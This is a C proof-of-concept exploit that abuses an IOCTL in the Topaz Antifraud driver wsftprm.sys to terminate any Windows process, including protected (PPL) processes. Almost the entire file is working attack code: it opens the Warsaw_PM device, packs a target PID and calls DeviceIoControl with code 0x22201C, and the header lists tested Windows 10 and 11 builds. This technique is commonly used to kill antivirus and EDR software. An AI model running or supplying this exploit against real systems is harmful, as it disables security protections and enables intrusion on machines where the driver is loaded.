/*
    Proof of concept for killing any user-mode process, including protected processes light (PPL).
    The driver used was Topaz Antifraud wsftprm.sys 2.0.0.0
    The driver supports an IOCTL handler that allows any user to make an arbitrary ZwTerminateProcess call, ensuring that any process is terminated. 


    https://www.loldrivers.io/drivers/30e8d598-2c60-49e4-953b-a6f620da1371/

    KILL_PROCESS_IOCTL_CODE 0x22201C 

    Tested on:
        Windows 11 24H2 | Server 2025 (2024 Update, Germanium R1)
            build: 10.0.26100.1742
            date: 2024-09-06
        Windows 10 22H2 (2022 Update, Vibranium R5)
            build: 10.0.19045.2965
            date: 2023-05-05

    Author: @noqword
*/

#include <windows.h>
#include <stdio.h>

#define KILL_PROCESS_IOCTL_CODE 0x22201C
#define BUFFER_SIZE 0x40c


bool KillProcess(HANDLE hdriver, DWORD pid) {

    // Prepare the input buffer for the IOCTL call
    BYTE buffer[BUFFER_SIZE] = { 0 }; 

    // Copy the target PID into the buffer
    RtlCopyMemory(buffer, &pid, sizeof(pid));

    DWORD bytesReturned;

    // Call the IOCTL to kill the target process
    BOOL ok = DeviceIoControl(hdriver, KILL_PROCESS_IOCTL_CODE, buffer, BUFFER_SIZE, NULL, 0, &bytesReturned, NULL); 
    return ok;
}

void PrintUsage(const char* argv0) {
    
    printf("Usage: %s --kill <pid>\n", argv0);
    printf("Example: %s --kill 1234\n", argv0);
}

int main(int argc, char* argv[]) {

    if (argc != 3 || strcmp(argv[1], "--kill") != 0) {
        PrintUsage(argv[0]);
        return 1;
    }

    DWORD target_pid = (DWORD)atoi(argv[2]);

    //Handle to driver
    HANDLE hdriver = CreateFileA("\\\\.\\Warsaw_PM", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hdriver == INVALID_HANDLE_VALUE) {
        printf("[!] Could not open handle to driver\n");
        return 1;
    }

    BOOL ok = KillProcess(hdriver, target_pid);
    Sleep(1000); // Wait for a second to ensure the process is terminated

    if (ok) printf("[+] Process %lu successfully terminated\n", target_pid);
    else    printf("[!] Error terminating process %lu\n", target_pid);

    CloseHandle(hdriver);
    return 0;
}